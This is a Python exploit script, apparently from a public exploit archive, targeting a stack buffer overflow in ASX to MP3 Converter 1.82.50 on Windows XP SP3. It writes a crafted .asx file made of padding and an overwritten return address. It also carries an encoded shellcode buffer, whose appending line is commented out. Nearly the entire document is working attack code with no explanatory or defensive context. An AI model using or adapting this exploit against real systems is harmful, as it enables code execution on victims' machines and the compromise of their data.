'''
# Exploit Title: ASX to MP3 Converter 1.82.50 Stack Overflow
# Date: 2 Oct 2015
# Exploit Author: ex_ptr
# Vendor Homepage: http://mini-stream.net
# Software Link: http://www.topvideopro.com/download/ASXtoMP3Converter.exe
http://www.topvideopro.com/mp3wav/asx-mp3.htm
# Version: 1.82.50
# Tested on: Windows XP SP3
'''

import struct
filename = "exploit.asx"

# 260
# Exact match at offset 236
dummy = "A"*0x104
EIP   = struct.pack('<I', 0x76af3adc)
FFFF  = "\xFF\xFF\xFF\xFF"
NOP   = "\x90"*4

buf =  b""
buf += b"\xb8\xd9\x22\x9b\xbb\xda\xd5\xd9\x74\x24\xf4\x5d\x2b"
buf += b"\xc9\xb1\x52\x31\x45\x12\x83\xed\xfc\x03\x9c\x2c\x79"
buf += b"\x4e\xe2\xd9\xff\xb1\x1a\x1a\x60\x3b\xff\x2b\xa0\x5f"
buf += b"\x74\x1b\x10\x2b\xd8\x90\xdb\x79\xc8\x23\xa9\x55\xff"
buf += b"\x84\x04\x80\xce\x15\x34\xf0\x51\x96\x47\x25\xb1\xa7"
buf += b"\x87\x38\xb0\xe0\xfa\xb1\xe0\xb9\x71\x67\x14\xcd\xcc"
buf += b"\xb4\x9f\x9d\xc1\xbc\x7c\x55\xe3\xed\xd3\xed\xba\x2d"
buf += b"\xd2\x22\xb7\x67\xcc\x27\xf2\x3e\x67\x93\x88\xc0\xa1"
buf += b"\xed\x71\x6e\x8c\xc1\x83\x6e\xc9\xe6\x7b\x05\x23\x15"
buf += b"\x01\x1e\xf0\x67\xdd\xab\xe2\xc0\x96\x0c\xce\xf1\x7b"
buf += b"\xca\x85\xfe\x30\x98\xc1\xe2\xc7\x4d\x7a\x1e\x43\x70"
buf += b"\xac\x96\x17\x57\x68\xf2\xcc\xf6\x29\x5e\xa2\x07\x29"
buf += b"\x01\x1b\xa2\x22\xac\x48\xdf\x69\xb9\xbd\xd2\x91\x39"
buf += b"\xaa\x65\xe2\x0b\x75\xde\x6c\x20\xfe\xf8\x6b\x47\xd5"
buf += b"\xbd\xe3\xb6\xd6\xbd\x2a\x7d\x82\xed\x44\x54\xab\x65"
buf += b"\x94\x59\x7e\x29\xc4\xf5\xd1\x8a\xb4\xb5\x81\x62\xde"
buf += b"\x39\xfd\x93\xe1\x93\x96\x3e\x18\x74\x59\x16\x55\x43"
buf += b"\x31\x65\x99\x4a\x79\xe0\x7f\x26\x6d\xa5\x28\xdf\x14"
buf += b"\xec\xa2\x7e\xd8\x3a\xcf\x41\x52\xc9\x30\x0f\x93\xa4"
buf += b"\x22\xf8\x53\xf3\x18\xaf\x6c\x29\x34\x33\xfe\xb6\xc4"
buf += b"\x3a\xe3\x60\x93\x6b\xd5\x78\x71\x86\x4c\xd3\x67\x5b"
buf += b"\x08\x1c\x23\x80\xe9\xa3\xaa\x45\x55\x80\xbc\x93\x56"
buf += b"\x8c\xe8\x4b\x01\x5a\x46\x2a\xfb\x2c\x30\xe4\x50\xe7"
buf += b"\xd4\x71\x9b\x38\xa2\x7d\xf6\xce\x4a\xcf\xaf\x96\x75"
buf += b"\xe0\x27\x1f\x0e\x1c\xd8\xe0\xc5\xa4\xf8\x02\xcf\xd0"
buf += b"\x90\x9a\x9a\x58\xfd\x1c\x71\x9e\xf8\x9e\x73\x5f\xff"
buf += b"\xbf\xf6\x5a\xbb\x07\xeb\x16\xd4\xed\x0b\x84\xd5\x27"

exploit = dummy + EIP + FFFF
# + NOP + buf

f = open(filename,'wb')
f.write(exploit)
f.close()
